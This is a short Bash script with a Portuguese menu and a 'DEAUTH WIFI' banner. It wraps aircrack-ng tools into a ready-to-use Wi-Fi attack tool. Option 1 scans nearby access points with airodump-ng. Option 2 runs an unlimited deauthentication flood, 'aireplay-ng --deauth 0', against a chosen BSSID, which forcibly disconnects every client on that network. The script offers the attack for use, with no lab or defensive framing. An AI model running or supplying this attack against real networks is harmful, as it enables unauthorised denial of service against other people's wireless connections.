#!/bin/bash
x="teste"
menu ()
{
while true $x != "teste"
do
clear
echo -e "\e[38;5;202m"
echo '██████╗ ███████╗ █████╗ ██╗   ██╗████████╗██╗  ██╗    ██╗    ██╗██╗███████╗██╗'
echo '██╔══██╗██╔════╝██╔══██╗██║   ██║╚══██╔══╝██║  ██║    ██║    ██║██║██╔════╝██║'
echo '██║  ██║█████╗  ███████║██║   ██║   ██║   ███████║    ██║ █╗ ██║██║█████╗  ██║'
echo '██║  ██║██╔══╝  ██╔══██║██║   ██║   ██║   ██╔══██║    ██║███╗██║██║██╔══╝  ██║'
echo '██████╔╝███████╗██║  ██║╚██████╔╝   ██║   ██║  ██║    ╚███╔███╔╝██║██║     ██║'
echo '╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝'
echo ""
echo -e "\e[38;5;36m================================================"
echo -e "\e[38;5;36mBy \e[38;5;202mGabrielSerraTG"
echo -e "\e[36m"
echo "1)BSSID"
echo""
echo "2)Attack"
echo ""
echo "99)Sair"
echo -e "\e[38;5;36m================================================"

echo -e "\e[36mDigite a opção desejada:"
read x
echo "Opção informada ($x)"
echo "================================================"

case "$x" in


    1)
      printf "Informe a interface: " $iface
      read iface
      airodump-ng $iface
      sleep 5

echo "================================================"
;;
    2)
      printf "Informe a bssid: " $bssid
      read bssid
      printf "Informe a interface: " $iface
      read iface
      aireplay-ng --deauth 0 -a $bssid $iface
      sleep 5
echo "================================================"
;;
       99)
         echo "saindo..."
         sleep 5;
	 clear;
	 exit;
;;
*)
        echo "Opção inválida!"
esac
done

}
menu
